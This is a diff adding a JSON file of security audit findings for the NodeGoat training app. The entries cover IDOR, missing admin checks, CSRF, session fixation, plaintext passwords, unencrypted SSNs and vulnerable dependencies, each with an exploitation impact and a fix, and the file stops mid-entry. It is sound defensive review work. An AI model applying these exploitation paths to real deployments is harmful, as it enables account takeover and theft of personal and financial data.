@@ -1,0 +1,792 @@
+[
+  {
+    "id": "access-idor-allocations",
+    "cwe": "CWE-639",
+    "owasp": "A01:2021 Broken Access Control",
+    "severity": "high",
+    "confidence": "confirmed",
+    "title": "Allocations route trusts the :userId path parameter with no ownership check (IDOR)",
+    "file": "app/routes/index.js",
+    "line": 63,
+    "snippet": "app.get(\"/allocations/:userId\", isLoggedIn, allocationsHandler.displayAllocations);",
+    "evidence": "The only middleware in front of this route is isLoggedIn (sessionHandler.isLoggedInMiddleware, app/routes/session.js:36-42), which merely checks that req.session.userId is set and calls next() — it never compares the session's user to the requested :userId. The handler, AllocationsHandler.displayAllocations (app/routes/allocations.js:11-31), reads `const { userId } = req.params;` at line 16-18 and passes that value straight to allocationsDAO.getByUserIdAndThreshold(userId, threshold, ...) at line 23 with no ownership check anywhere in between. A commented-out block at allocations.js:12-15 ('Fix for A4 Insecure DOR - take user id from session instead of from URL param') confirms the maintainers identified this exact gap and left the insecure version active.",
+    "impact": "Any authenticated user can enumerate other users' financial allocation records (stocks/funds/bonds percentages) by changing the :userId segment in the URL, e.g. GET /allocations/2 while logged in as user 1.",
+    "fix": "Ignore req.params.userId for authorization purposes; derive the target user from req.session.userId, or explicitly verify req.session.userId matches the requested :userId (or that the caller is an admin) before querying.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/639.html"
+    ]
+  },
+  {
+    "id": "access-missing-role-benefits-get",
+    "cwe": "CWE-862",
+    "owasp": "A01:2021 Broken Access Control",
+    "severity": "medium",
+    "confidence": "confirmed",
+    "title": "Benefits listing is reachable by any logged-in user, not only admins",
+    "file": "app/routes/index.js",
+    "line": 55,
+    "snippet": "app.get(\"/benefits\", isLoggedIn, benefitsHandler.displayBenefits);",
+    "evidence": "app/routes/index.js:27 defines `const isAdmin = sessionHandler.isAdminUserMiddleware;` (backed by session.js:25-34, which checks user.isAdmin from the database), but this route's middleware chain is only [isLoggedIn] — isAdmin is never applied. The commented-out line directly above at index.js:58 ('app.get(\"/benefits\", isLoggedIn, isAdmin, benefitsHandler.displayBenefits);') shows the intended admin-gated version was written but not activated. displayBenefits (app/routes/benefits.js:13-27) calls benefitsDAO.getAllNonAdminUsers, which returns every non-admin employee's record including benefitStartDate, and unconditionally renders the page with `user: { isAdmin: true }`, i.e. it assumes only an admin can reach it.",
+    "impact": "Any authenticated, non-admin employee can view the full list of other employees' benefits records, an admin-only HR function.",
+    "fix": "Add the isAdmin middleware to this route: app.get(\"/benefits\", isLoggedIn, isAdmin, benefitsHandler.displayBenefits).",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/862.html"
+    ]
+  },
+  {
+    "id": "access-missing-role-benefits-post",
+    "cwe": "CWE-862",
+    "owasp": "A01:2021 Broken Access Control",
+    "severity": "critical",
+    "confidence": "confirmed",
+    "title": "Any authenticated user can modify another user's benefit start date via an unguarded admin route",
+    "file": "app/routes/index.js",
+    "line": 56,
+    "snippet": "app.post(\"/benefits\", isLoggedIn, benefitsHandler.updateBenefits);",
+    "evidence": "As with the GET route, the isAdmin middleware (session.js:25-34, checking user.isAdmin) exists in this same file but is not part of this route's chain — only isLoggedIn is applied. The commented-out fix at index.js:59 confirms the intended chain was [isLoggedIn, isAdmin]. updateBenefits (app/routes/benefits.js:29-54) reads `const { userId, benefitStartDate } = req.body;` directly from the request body and passes them unchecked to benefitsDAO.updateBenefits(userId, benefitStartDate, ...) (app/data/benefits-dao.js:23-40), which runs `usersCol.update({ _id: parseInt(userId) }, { $set: { benefitStartDate: startDate } })` — an arbitrary user id chosen by the caller, with no check that the caller is an admin or owns that record.",
+    "impact": "Any logged-in, non-admin user can send a crafted POST to /benefits with an arbitrary userId to overwrite any other employee's benefitStartDate, a combination of vertical privilege escalation (admin-only action) and horizontal IDOR (arbitrary target user).",
+    "fix": "Add the isAdmin middleware to this route: app.post(\"/benefits\", isLoggedIn, isAdmin, benefitsHandler.updateBenefits), and additionally validate userId server-side.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/862.html"
+    ]
+  },
+  {
+    "id": "access-session-fixation-login",
+    "cwe": "CWE-384",
+    "owasp": "A07:2021 Identification and Authentication Failures",
+    "severity": "medium",
+    "confidence": "confirmed",
+    "title": "Session id is not regenerated after successful login, enabling session fixation",
+    "file": "app/routes/index.js",
+    "line": 34,
+    "snippet": "app.post(\"/login\", sessionHandler.handleLoginRequest);",
+    "evidence": "handleLoginRequest (app/routes/session.js:53-119) verifies the password via userDAO.validateLogin and then, on success, sets `req.session.userId = user._id;` directly at session.js:116 with no call to req.session.regenerate() first — the express-session id issued before login is kept as-is. This is confirmed by contrast with the signup handler in the same file, handleSignup (session.js:189-254), which does call `req.session.regenerate(() => { req.session.userId = user._id; ... })` at session.js:234-243 after creating a user. A code comment directly above the login handler's assignment (session.js:104-115) explicitly describes the exact fix needed ('regenerating a session in each login... req.session.regenerate()') but it was not applied to this path.",
+    "impact": "An attacker who fixes a victim's pre-login session id (e.g. by sending them a link containing a session cookie, since saveUninitialized:true issues a session id to anonymous visitors) inherits the victim's authenticated session once the victim logs in with that same id, because the id is never rotated at login.",
+    "fix": "Wrap the post-authentication state change in req.session.regenerate(), as already done in handleSignup: req.session.regenerate(() => { req.session.userId = user._id; return res.redirect(...); });",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/384.html"
+    ]
+  },
+  {
+    "id": "access-csrf-profile-update",
+    "cwe": "CWE-352",
+    "owasp": "A01:2021 Broken Access Control",
+    "severity": "high",
+    "confidence": "confirmed",
+    "title": "State-changing profile update (including bank account and SSN) has no CSRF protection",
+    "file": "app/routes/index.js",
+    "line": 48,
+    "snippet": "app.post(\"/profile\", isLoggedIn, profileHandler.handleProfileUpdate);",
+    "evidence": "This route's only middleware is isLoggedIn, which is satisfied by any request carrying a valid session cookie; there is no CSRF-token middleware anywhere in the chain. server.js declares `const csrf = require('csurf');` at line 7 but the entire block that would mount it is commented out at server.js:104-113 ('app.use(csrf()); ... res.locals.csrftoken = req.csrfToken();'), so req.csrfToken() is never available and no incoming request is ever checked for a token — csurf is present in package.json (line 11) and the view app/views/profile.html:73 even renders a hidden `_csrf` field expecting `{{csrftoken}}`, but nothing on the server side validates it. handleProfileUpdate (app/routes/profile.js:40-107) applies the change from req.body (firstName, lastName, ssn, dob, address, bankAcc, bankRouting) using only req.session.userId as the target, so a forged cross-site POST from a page the victim merely visits while logged in is processed identically to a legitimate request.",
+    "impact": "An attacker can host a page that auto-submits a POST to /profile from a logged-in victim's browser and silently change the victim's bank account/routing number, SSN, or address, since the browser attaches the session cookie automatically and no token or origin check exists.",
+    "fix": "Mount csurf before the routes are registered (app.use(csrf()); app.use((req,res,next)=>{res.locals.csrftoken=req.csrfToken();next();});) and verify the token on every state-changing route, or move to double-submit/SameSite=Strict cookies plus an Origin check.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/352.html"
+    ]
+  },
+  {
+    "id": "access-no-rate-limit-login",
+    "cwe": "CWE-307",
+    "owasp": "A07:2021 Identification and Authentication Failures",
+    "severity": "medium",
+    "confidence": "confirmed",
+    "title": "Login endpoint has no attempt limiting or lockout",
+    "file": "app/routes/index.js",
+    "line": 34,
+    "snippet": "app.post(\"/login\", sessionHandler.handleLoginRequest);",
+    "evidence": "This route's middleware chain is empty (no middleware at all, just the handler). Reading server.js top to bottom, the only middleware ever app.use()'d before routes(app, db) is invoked are favicon, bodyParser.json/urlencoded, and session() (server.js:68-102) — no rate-limiting, throttling, or account-lockout middleware (e.g. express-rate-limit, express-brute) is present anywhere in server.js, package.json's dependency list, or app/routes/session.js. handleLoginRequest (session.js:53-119) itself also tracks no failed-attempt counter or delay; every failed usersCol.findOne/comparePassword cycle simply re-renders the login form and returns immediately, ready for the next attempt.",
+    "impact": "An attacker can submit unlimited password guesses against any known username at full network speed, making online brute-force or credential-stuffing against /login practical.",
+    "fix": "Add per-account and per-IP attempt limiting (e.g. express-rate-limit keyed on userName) with exponential backoff or temporary lockout after a small number of failed attempts.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/307.html"
+    ]
+  },
+  {
+    "id": "access-timing-unsafe-password-compare",
+    "cwe": "CWE-208",
+    "owasp": "A07:2021 Identification and Authentication Failures",
+    "severity": "low",
+    "confidence": "confirmed",
+    "title": "Login password check uses a non-constant-time string comparison",
+    "file": "app/data/user-dao.js",
+    "line": 61,
+    "snippet": "return fromDB === fromUser;",
+    "evidence": "validateLogin (user-dao.js:57-94) defines comparePassword at lines 60-67 to compare the stored and submitted password, and its active implementation is `return fromDB === fromUser;` at line 61 — JavaScript's strict-equality on strings short-circuits at the first differing character, so comparison time leaks how many leading characters of a guess are correct. The commented-out alternative directly below it, `return bcrypt.compareSync(fromDB, fromUser);` (line 65), which would both hash and compare in constant time, was never activated; correspondingly addUser (user-dao.js:17-31) stores `password` as the plaintext value from the request at line 25, with bcrypt.hashSync commented out at line 29, so the comparison is between two plaintext strings.",
+    "impact": "A network attacker able to measure response-time differences precisely (harder but not impossible remotely, easier on a shared host or LAN) can incrementally recover a victim's password one character at a time instead of needing the full keyspace.",
+    "fix": "Store passwords hashed with bcrypt (bcrypt.hashSync at signup) and verify with bcrypt.compareSync/bcrypt.compare at login, which performs the check without leaking timing information about partial matches.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/208.html"
+    ]
+  },
+  {
+    "id": "access-session-no-absolute-expiry",
+    "cwe": "CWE-613",
+    "owasp": "A07:2021 Identification and Authentication Failures",
+    "severity": "low",
+    "confidence": "confirmed",
+    "title": "Session cookie has no maxAge, so authenticated sessions never expire on their own",
+    "file": "server.js",
+    "line": 78,
+    "endLine": 85,
+    "snippet": "app.use(session({\n    // genid: (req) => {\n    //    return genuuid() // use UUIDs for session IDs\n    //},\n    secret: cookieSecret,\n    // Both mandatory in Express v4\n    saveUninitialized: true,\n    resave: true",
+    "evidence": "The express-session options object passed here (server.js:78-102) has no `cookie` key at all — the entire cookie block, including the TODO comment 'Add \"maxAge\"' and a commented httpOnly setting, sits inside a disabled /* ... */ block at server.js:92-100 and is never applied. A repo-wide search for maxAge (outside comments and unused tutorial HTML pages) confirms no other file sets it. Combined with resave:true and saveUninitialized:true, the server keeps refreshing and persisting the session store entry on every request, and the only path that ends a session is the explicit destroy in displayLogoutPage (app/routes/session.js:121-123); nothing ever expires a session the user simply leaves open.",
+    "impact": "A stolen or left-open session cookie (e.g. on a shared computer, or exfiltrated once) remains valid indefinitely until the user explicitly logs out, with no server-enforced absolute lifetime.",
+    "fix": "Set an explicit cookie.maxAge (and consider a rolling: false absolute cap) in the session() configuration, e.g. cookie: { maxAge: 30 * 60 * 1000 }.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/613.html"
+    ]
+  },
+  {
+    "id": "data-plaintext-password-storage",
+    "cwe": "CWE-256",
+    "owasp": "A02:2021 Cryptographic Failures",
+    "severity": "high",
+    "confidence": "confirmed",
+    "title": "User passwords are stored and compared in plaintext",
+    "file": "app/data/user-dao.js",
+    "line": 25,
+    "snippet": "password //received from request param",
+    "evidence": "addUser() (app/data/user-dao.js lines 17-31) builds the MongoDB user document directly from the signup form's password field with no hashing; the commented-out line 29 `password: bcrypt.hashSync(password, bcrypt.genSaltSync())` shows the hashing call exists in the codebase but is disabled. usersCol.insert(user, ...) then persists this raw value. validateLogin()'s comparePassword helper at line 61 (`return fromDB === fromUser;`) does a direct string equality check against the stored value, which only works if the stored value is the plaintext password, confirming nothing in the active code path ever hashes it. bcrypt-nodejs is imported at line 1 but its hashing/compare functions are never invoked.",
+    "impact": "Anyone who can read the users collection (a database compromise, an unrestricted backup, an operator with DB access, or any NoSQL-injection/IDOR bug elsewhere in the app) recovers every user's real password in clear text, which typically also compromises those users' accounts on other sites through password reuse.",
+    "fix": "Hash passwords with bcrypt (or argon2id) at signup using a modern cost factor, store only the hash, and compare with bcrypt.compare()/argon2.verify() in validateLogin instead of ===.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/256.html",
+      "https://owasp.org/Top10/A02_2021-Cryptographic_Failures/"
+    ]
+  },
+  {
+    "id": "data-hardcoded-crypto-key",
+    "cwe": "CWE-798",
+    "owasp": "A02:2021 Cryptographic Failures",
+    "severity": "low",
+    "confidence": "confirmed",
+    "title": "Encryption key for PII fields is hard-coded in the committed configuration",
+    "file": "config/env/all.js",
+    "line": 9,
+    "snippet": "cryptoKey: \"a_secure_key_for_crypto_here\",",
+    "evidence": "config/env/all.js exports this literal `cryptoKey` alongside `cryptoAlgo: \"aes256\"`. app/data/profile-dao.js lines 18-39 (currently commented out) show the intended use: `crypto.createCipheriv(config.cryptoAlgo, config.cryptoKey, config.iv)` to encrypt ssn/dob before storage. That encryption path is disabled today (see the CWE-311 finding below), so this key is currently unused, but it is still a committed, shared secret that would defeat the encryption the moment that code path is re-enabled without rotating the key.",
+    "impact": "If the commented-out encryption code is turned back on without changing this key, every deployment shares the same encryption key from the public repository, letting anyone who has read the source decrypt any SSN/DOB stored under it.",
+    "fix": "Never commit encryption keys; load cryptoKey from a secrets manager or environment variable and rotate the value before enabling the encryption path.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/798.html",
+      "https://owasp.org/Top10/A02_2021-Cryptographic_Failures/"
+    ]
+  },
+  {
+    "id": "data-ssn-dob-bank-stored-unencrypted",
+    "cwe": "CWE-311",
+    "owasp": "A02:2021 Cryptographic Failures",
+    "severity": "high",
+    "confidence": "confirmed",
+    "title": "SSN and date of birth are written to the database unencrypted; the encryption code exists but is disabled",
+    "file": "app/data/profile-dao.js",
+    "line": 62,
+    "snippet": "user.ssn = ssn;",
+    "evidence": "handleProfileUpdate (app/routes/profile.js lines 40-105) takes `ssn`, `dob`, `bankAcc`, `bankRouting` straight from req.body and calls profile.updateUser(). Inside updateUser (app/data/profile-dao.js lines 42-92), `ssn` is assigned to the document field verbatim at line 62 (and `dob` at line 65, `bankAcc`/`bankRouting` at lines 56-59), then `users.update({ _id: parseInt(userId) }, { $set: user }, ...)` at line 78 writes it to MongoDB as-is. The encrypt/decrypt helpers built with crypto.pbkdf2Sync/createCipheriv (lines 15-40) and the call sites that would have used them (`user.ssn = encrypt(ssn)` at line 71, `user.dob = decrypt(user.dob)` at line 103) are present only as comments — none of that code runs.",
+    "impact": "Anyone who reads the users collection (database compromise, an unrestricted backup, or another bug that leaks DB contents) gets every stored SSN, date of birth, bank account number, and routing number in plain text — this is enough to open credit or bank accounts in a victim's name.",
+    "fix": "Re-enable field-level encryption (or use MongoDB's native encrypted-fields support) for ssn, dob, bankAcc and bankRouting before writing them, using a key that is not the hard-coded one in config/env/all.js.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/311.html",
+      "https://owasp.org/Top10/A02_2021-Cryptographic_Failures/"
+    ]
+  },
+  {
+    "id": "dependencies-underscore-rce",
+    "cwe": "CWE-94",
+    "owasp": "A06:2021 Vulnerable and Outdated Components",
+    "severity": "critical",
+    "confidence": "confirmed",
+    "title": "underscore is pinned to a version with a known arbitrary-code-execution advisory",
+    "file": "package.json",
+    "line": 23,
+    "snippet": "\"underscore\": \"^1.8.3\"",
+    "evidence": "package.json:23 declares underscore at ^1.8.3; package-lock.json resolves it to 1.9.1. `npm audit --json` run in the target (the registry was reachable; the report returned real advisory data, not an error) lists underscore's installed range as <=1.13.7 and reports GHSA-cf4h-3jhx-xvhq, 'Arbitrary Code Execution in underscore', CWE-94, severity critical, affecting >=1.3.2 <1.12.1 — 1.9.1 falls inside that range. The same audit entry also carries GHSA-qpx9-hpmf-5gmw (unbounded recursion in _.flatten/_.isEqual, CWE-674/CWE-770, high, affecting <=1.13.7), so this one direct dependency carries 2 distinct advisories, both on the package itself rather than a transitive dependency.",
+    "impact": "underscore's template compiler (_.template) can be driven to execute attacker-supplied code when template strings come from untrusted input, and _.isEqual/_.flatten can be driven into unbounded recursion causing a process crash (DoS).",
+    "fix": "Upgrade to underscore >=1.13.8 (npm registry's current latest at review time), which resolves both advisories; audit's own fixAvailable path points at grunt-retire@0.1.0 as the only path that would downgrade transitively, so upgrade the direct declaration in package.json directly rather than relying on `npm audit fix`.",
+    "references": [
+      "https://github.com/advisories/GHSA-cf4h-3jhx-xvhq",
+      "https://github.com/advisories/GHSA-qpx9-hpmf-5gmw",
+      "https://cwe.mitre.org/data/definitions/94.html"
+    ]
+  },
+  {
+    "id": "dependencies-swig-file-read-abandoned",
+    "cwe": "CWE-22",
+    "owasp": "A06:2021 Vulnerable and Outdated Components",
+    "severity": "critical",
+    "confidence": "confirmed",
+    "title": "swig template engine has an unpatched arbitrary local file read and has had no release since 2014",
+    "file": "package.json",
+    "line": 22,
+    "snippet": "\"swig\": \"^1.4.2\",",
+    "evidence": "package.json:22 declares swig at ^1.4.2; package-lock.json resolves it to 1.4.2, the exact version `npm audit --json` flags. The audit entry (severity critical, range <=1.4.2) carries GHSA-2rq5-699j-x7p6, 'Arbitrary local file read vulnerability during template rendering', CWE-22, severity high, with `fixAvailable: false`. `npm view swig time --json` against the live registry shows 1.4.2, published 2014-08-04, is still the newest version ever published (created 2011-09-02); `npm view swig deprecated` returns 'This package is no longer maintained'. No newer release exists to move to.",
+    "impact": "A template that embeds attacker-influenced data into a path swig resolves can be made to read arbitrary files off the server's filesystem; because the package is abandoned, this is unfixed and will stay unfixed upstream.",
+    "fix": "There is no in-range fix; replace swig with a maintained template engine (the project itself now recommends nunjucks or consolidate's other supported engines) and confirm no user input reaches a template path before doing so.",
+    "references": [
+      "https://github.com/advisories/GHSA-2rq5-699j-x7p6",
+      "https://cwe.mitre.org/data/definitions/22.html",
+      "https://cwe.mitre.org/data/definitions/1104.html"
+    ]
+  },
+  {
+    "id": "dependencies-mongodb-driver-dos",
+    "cwe": "CWE-400",
+    "owasp": "A06:2021 Vulnerable and Outdated Components",
+    "severity": "high",
+    "confidence": "confirmed",
+    "title": "mongodb driver is pinned to a version vulnerable to a denial-of-service advisory",
+    "file": "package.json",
+    "line": 18,
+    "snippet": "\"mongodb\": \"^2.1.18\",",
+    "evidence": "package.json:18 declares mongodb at ^2.1.18; package-lock.json resolves it to 2.2.36. `npm audit --json` reports the installed range as <=3.1.12 (audit-computed severity critical from the bundled subtree) and cites GHSA-mh5c-679w-hh4r, 'Denial of Service in mongodb', severity high, affecting <3.1.13 — 2.2.36 is well inside that range. The audit entry also pulls in mongodb-core, whose own subtree adds 2 further distinct advisories (GHSA-4jwp-vfvf-657p, GHSA-v8w9-2789-6hhr), for 3 distinct advisories total under this one direct dependency.",
+    "impact": "A malformed or crafted server response the driver parses can exhaust resources on the application process, denying service to legitimate users.",
+    "fix": "`fixAvailable` in the audit report names mongodb@7.6.0 as the resolving version, which is a major-version jump from the 2.x driver in use (isSemVerMajor: true); the 2.x/mongodb-core connection code will need updating to the modern driver's API as part of the upgrade.",
+    "references": [
+      "https://github.com/advisories/GHSA-mh5c-679w-hh4r",
+      "https://cwe.mitre.org/data/definitions/400.html"
+    ]
+  },
+  {
+    "id": "dependencies-marked-redos",
+    "cwe": "CWE-1333",
+    "owasp": "A06:2021 Vulnerable and Outdated Components",
+    "severity": "high",
+    "confidence": "confirmed",
+    "title": "marked is pinned to a 2015-era version with six distinct XSS and ReDoS advisories",
+    "file": "package.json",
+    "line": 17,
+    "snippet": "\"marked\": \"0.3.5\",",
+    "evidence": "package.json:17 pins marked at the exact version 0.3.5 (no caret), which is also what package-lock.json resolves. `npm audit --json` reports 6 distinct advisories against this single package: GHSA-7px7-7xjx-hxm8 (XSS from data URIs, CWE-79, moderate, <0.3.7), GHSA-vfvf-mqq8-rwqc (HTML-entity sanitization bypass, CWE-79, moderate, <0.3.6), GHSA-x5pg-88wf-qq4p (ReDoS, high, <0.3.9), GHSA-p9wx-2529-fp83 (ReDoS, moderate, <0.3.17), and two 'Inefficient Regular Expression Complexity' entries GHSA-rrrm-qjm4-v8hf and GHSA-5v2h-r2cx-5xgj (both CWE-1333, high, <4.0.10). 0.3.5 falls inside every one of these ranges.",
+    "impact": "Markdown content rendered through this version (NodeGoat's memo/comment views render user-supplied markdown) can carry a payload that either executes as script in a victim's browser (XSS) or pins a worker thread in catastrophic regex backtracking, denying service.",
+    "fix": "npm's audit-suggested non-major patch is marked@0.3.19, which closes the pre-0.3.17 issues only; the two CWE-1333 entries need >=4.0.10. Move to a current maintained release (18.0.14 is latest on the registry at review time) and re-check call sites for the 4.x API changes.",
+    "references": [
+      "https://github.com/advisories/GHSA-7px7-7xjx-hxm8",
+      "https://github.com/advisories/GHSA-x5pg-88wf-qq4p",
+      "https://github.com/advisories/GHSA-rrrm-qjm4-v8hf",
+      "https://cwe.mitre.org/data/definitions/1333.html"
+    ]
+  },
+  {
+    "id": "dependencies-body-parser-dos",
+    "cwe": "CWE-405",
+    "owasp": "A06:2021 Vulnerable and Outdated Components",
+    "severity": "high",
+    "confidence": "confirmed",
+    "title": "body-parser is pinned to a version vulnerable to a URL-encoding denial-of-service",
+    "file": "package.json",
+    "line": 9,
+    "snippet": "\"body-parser\": \"^1.15.1\",",
+    "evidence": "package.json:9 declares body-parser at ^1.15.1; package-lock.json resolves it to 1.18.3. `npm audit --json` reports the installed range as <=1.20.5 and cites two advisories on the package itself: GHSA-qwcr-r2fm-qrc7, 'body-parser vulnerable to denial of service when url encoding is enabled', CWE-405, severity high, affecting <1.20.3; and GHSA-v422-hmwv-36x6 (invalid limit value silently disables size enforcement, CWE-770, low, affecting <1.20.6). It additionally pulls in qs, whose own subtree carries 6 further distinct prototype-pollution/DoS advisories, for 8 distinct advisories total under this one direct dependency.",
+    "impact": "A request body using URL encoding can be crafted to consume disproportionate CPU while body-parser parses it, degrading or denying service for other requests on the same process (body-parser sits on every route that accepts a body in this Express app).",
+    "fix": "Upgrade to body-parser >=1.20.6, which resolves both of the package's own advisories; the audit report marks this fix as available without a SemVer-major bump.",
+    "references": [
+      "https://github.com/advisories/GHSA-qwcr-r2fm-qrc7",
+      "https://github.com/advisories/GHSA-v422-hmwv-36x6",
+      "https://cwe.mitre.org/data/definitions/405.html"
+    ]
+  },
+  {
+    "id": "dependencies-express-outdated",
+    "cwe": "CWE-1104",
+    "owasp": "A06:2021 Vulnerable and Outdated Components",
+    "severity": "high",
+    "confidence": "confirmed",
+    "title": "express is pinned to an outdated 4.16.x line carrying 16 distinct advisories across its own code and its bundled router/body/static-file dependencies",
+    "file": "package.json",
+    "line": 13,
+    "snippet": "\"express\": \"^4.13.4\",",
+    "evidence": "package.json:13 declares express at ^4.13.4; package-lock.json resolves it to 4.16.4. `npm audit --json` reports the installed range as <=4.21.2 and lists two advisories on express itself — GHSA-qw6h-vgh9-j6wx (XSS via response.redirect(), CWE-79, low, <4.20.0) and GHSA-rv95-896h-c2vc (open redirect on malformed URLs, CWE-601/CWE-1286, moderate, <4.19.2) — plus 6 bundled dependencies each carrying their own advisories: body-parser (see the separate finding above), cookie, path-to-regexp (3 distinct ReDoS advisories, e.g. GHSA-37ch-88jc-xwx2, CWE not always set but described as backtracking regex, high), qs (prototype-pollution/DoS, high), send and serve-static (template-injection XSS, CWE-79, low each). Walking the full via-chain gives 16 distinct advisory URLs reachable through this one direct dependency.",
+    "impact": "The open redirect and response.redirect() XSS are directly reachable from any route that calls res.redirect() with attacker-influenced input; the bundled router and body-parsing dependencies add further DoS and prototype-pollution exposure on every request the framework routes.",
+    "fix": "`npm audit --json` marks express fixable without a SemVer-major bump (fixAvailable: true); upgrading within the 4.x line closes the two express-specific advisories, but path-to-regexp and qs's remaining high-severity issues require express's own newer minor releases that bump those bundled versions — track `npm audit fix` output rather than bumping express alone.",
+    "references": [
+      "https://github.com/advisories/GHSA-qw6h-vgh9-j6wx",
+      "https://github.com/advisories/GHSA-rv95-896h-c2vc",
+      "https://cwe.mitre.org/data/definitions/1104.html"
+    ]
+  },
+  {
+    "id": "dependencies-helmet-outdated",
+    "cwe": "CWE-1104",
+    "owasp": "A06:2021 Vulnerable and Outdated Components",
+    "severity": "high",
+    "confidence": "confirmed",
+    "title": "helmet is pinned to a version that pulls in a ReDoS advisory (debug) and a CSP configuration-override advisory (helmet-csp)",
+    "file": "package.json",
+    "line": 16,
+    "snippet": "\"helmet\": \"^2.0.0\",",
+    "evidence": "package.json:16 declares helmet at ^2.0.0; package-lock.json resolves it to 2.3.0. `npm audit --json` reports the installed range as 0.3.0 - 3.20.1, severity high, with no advisory on helmet's own code but two transitive dependencies each carrying their own: connect (pulls in debug, whose GHSA-9vvw-cc9w-f27h 'Inefficient Regular Expression Complexity', CWE-1333, high, affects <2.6.9 — the resolved debug is inside that range) and helmet-csp (GHSA-c3m8-x3cg-qm2c, 'Configuration Override in helmet-csp', moderate). That is 4 distinct advisories reachable through this one direct dependency.",
+    "impact": "A crafted value logged through connect's debug dependency can trigger catastrophic backtracking (DoS); the helmet-csp configuration-override advisory can let a later call silently widen the Content-Security-Policy the app believes it has set, weakening the app's own XSS mitigation.",
+    "fix": "Upgrade helmet to a current major release (8.3.0 is latest on the registry at review time); helmet's own API was restructured across majors (CSP is now `helmet.contentSecurityPolicy()` rather than a separate helmet-csp package), so treat this as a supported-version migration, not a patch bump.",
+    "references": [
+      "https://github.com/advisories/GHSA-9vvw-cc9w-f27h",
+      "https://github.com/advisories/GHSA-c3m8-x3cg-qm2c",
+      "https://cwe.mitre.org/data/definitions/1104.html"
+    ]
+  },
+  {
+    "id": "dependencies-forever-outdated",
+    "cwe": "CWE-1104",
+    "owasp": "A06:2021 Vulnerable and Outdated Components",
+    "severity": "critical",
+    "confidence": "confirmed",
+    "title": "forever is pinned to a version whose process-supervision chain (flatiron/nconf/optimist) carries a critical prototype-pollution advisory",
+    "file": "package.json",
+    "line": 15,
+    "snippet": "\"forever\": \"^2.0.0\",",
+    "evidence": "package.json:15 declares forever at ^2.0.0; package-lock.json resolves it to 2.0.0. `npm audit --json` reports the installed range as >=0.7.4, audit-computed severity critical, with no advisory on forever's own code but on its dependency chain: flatiron, forever-monitor, nconf (GHSA-6xwr-q98w-rvg7, 'Prototype Pollution in nconf', CWE not set by the advisory itself but categorically prototype pollution, high, affecting <=0.11.3 — the resolved nconf is inside that range), and optimist. 5 distinct advisories total reachable through this one direct dependency.",
+    "impact": "forever is the process supervisor NodeGoat's own `npm start`/deployment path uses to keep server.js running; a prototype-pollution primitive in its configuration-loading chain (nconf) can let an attacker who controls configuration input influence object behavior across the supervised process.",
+    "fix": "`npm audit --json` names forever@4.0.3 as the fix, marked isSemVerMajor: true — this is a major-version upgrade with a changed CLI/API, not a drop-in bump.",
+    "references": [
+      "https://github.com/advisories/GHSA-6xwr-q98w-rvg7",
+      "https://cwe.mitre.org/data/definitions/1104.html"
+    ]
+  },
+  {
+    "id": "dependencies-bcrypt-nodejs-abandoned",
+    "cwe": "CWE-1104",
+    "owasp": "A06:2021 Vulnerable and Outdated Components",
+    "severity": "low",
+    "confidence": "confirmed",
+    "title": "Password hashing depends on bcrypt-nodejs, a package the registry itself marks no longer maintained",
+    "file": "package.json",
+    "line": 8,
+    "snippet": "\"bcrypt-nodejs\": \"0.0.3\",",
+    "evidence": "package.json:8 pins bcrypt-nodejs at the exact version 0.0.3, its final published version. `npm audit --json` lists no CVE/GHSA against it (it is not in the audit's vulnerabilities map), so this is a maintenance finding, not a vulnerability finding. `npm view bcrypt-nodejs time --json` against the live registry shows 0.0.3 was published 2013-02-25 and no version has followed in the 12+ years since; `npm view bcrypt-nodejs deprecated` returns the publisher's own notice: 'bcrypt-nodejs is no longer actively maintained. Please use bcrypt or bcryptjs.'",
+    "impact": "This package performs the application's password hashing (a security-sensitive function). No advisory exists today, but an abandoned package with no maintainer will not receive a fix if one is found, and the pure-JS bcrypt implementation it carries has never been reviewed against the native `bcrypt` module it forked from.",
+    "fix": "Migrate to the actively maintained `bcrypt` (native binding) or `bcryptjs` (pure JS, API-compatible) package the publisher's own deprecation notice names.",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/1104.html",
+      "https://www.npmjs.com/package/bcrypt-nodejs"
+    ]
+  },
+  {
+    "id": "dependencies-node-esapi-abandoned",
+    "cwe": "CWE-1104",
+    "owasp": "A06:2021 Vulnerable and Outdated Components",
+    "severity": "info",
+    "confidence": "confirmed",
+    "title": "node-esapi has had exactly one release in its entire history, 11+ years ago",
+    "file": "package.json",
+    "line": 20,
+    "snippet": "\"node-esapi\": \"0.0.1\",",
+    "evidence": "package.json:20 pins node-esapi at 0.0.1. `npm audit --json` lists no advisory against it. `npm view node-esapi time --json` against the live registry shows a single published version, 0.0.1, on 2014-01-31, and nothing since; `npm view node-esapi deprecated` returns nothing (the registry does not carry an explicit deprecation notice), but a package with one release ever and no activity in over a decade has no realistic path to a fix if a defect is found in it.",
+    "impact": "No known vulnerability exists today; the risk is that this encoding/validation helper (an OWASP ESAPI port) will never be patched, and its single 2014 release predates a decade of since-documented encoding-bypass techniques in comparable libraries.",
+    "fix": "Confirm what NodeGoat actually uses this module for and replace it with a maintained equivalent (e.g. the `node-esapi` functionality is largely superseded by framework-level auto-escaping and libraries such as `dompurify`/`he` for the specific encoding NodeGoat needs).",
+    "references": [
+      "https://cwe.mitre.org/data/definitions/1104.html",
+      "https://www.npmjs.com/package/node-esapi"
+    ]
+  },
+  {
+    "id": "dependencies-devdependencies-outdated-bundle",
+    "cwe": "CWE-1104",
+    "owasp": "A06:2021 Vulnerable and Outdated Components",
+    "severity": "info",
+    "confidence": "confirmed",
+    "title": "14 devDependencies are pinned to versions with a combined 105 distinct advisories in their transitive trees",
+    "file": "package.json",
+    "line": 41,
+    "snippet": "\"devDependencies\": {",
